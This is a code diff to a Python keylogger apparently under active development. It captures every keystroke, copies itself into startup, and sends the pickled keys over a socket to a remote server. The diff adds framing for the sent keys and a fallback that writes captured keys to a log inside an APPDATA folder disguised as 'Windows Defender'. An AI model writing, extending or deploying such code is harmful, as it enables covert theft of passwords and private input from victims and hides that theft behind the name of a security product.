@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-from os import system, getenv, getlogin
+from os import system, getenv, getlogin, makedirs
 import socket
 from pickle import dumps
 Header = 10
@@ -8,6 +8,7 @@ Header = 10
 class Global:
     key_array = []
     i = 0
+    local_log = False
 
 
 class Socket:
@@ -61,6 +62,8 @@ class Socket:
 
 def no_safe_key_press(key):
     key = str(key).replace("'", "")
+    key = dumps(key)
+    key = bytes(f"{len(key):{Header}}", "utf-8") + key
     send = connection_established.send_char(key)
     if not send:
         Global.key_array.append(key)
@@ -72,7 +75,7 @@ def safe_key_press(key):
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
-    if Global.i == 50:
+    if Global.i == 20:
         Global.i = 0
         return False
 
@@ -87,14 +90,23 @@ def copy_to_startup(file_name):
         f.write(blanc)
 
 
+def save_log(array_to_save):
+    path = getenv('APPDATA') + "\\Windows Defender"
+    makedirs(path, exist_ok=True)
+    with open(path + "\\recvlog.txt", "a+")as f:
+        for char in array_to_save:
+            f.write(char)
+    Global.key_array = []
+
+
 connection_established = Socket()
 copy_to_startup("wasd")
 while True:
     if not Socket.connection:
         connection_established.connect_to_server()
 
-    if not Socket.cmd_received:
-        connection_established.receive_command()
+#    if not Socket.cmd_received:
+#        connection_established.receive_command()
     if Socket.connection and not Global.key_array:
         with Listener(on_press=no_safe_key_press)as f:
             f.join()
@@ -106,4 +118,8 @@ while True:
         with Listener(on_press=safe_key_press)as f:
             f.join()
         Global.key_array.append("Lost")
+        save_log(Global.key_array)
+
+
+# Log Datei mit Übergabe richtig machen
 
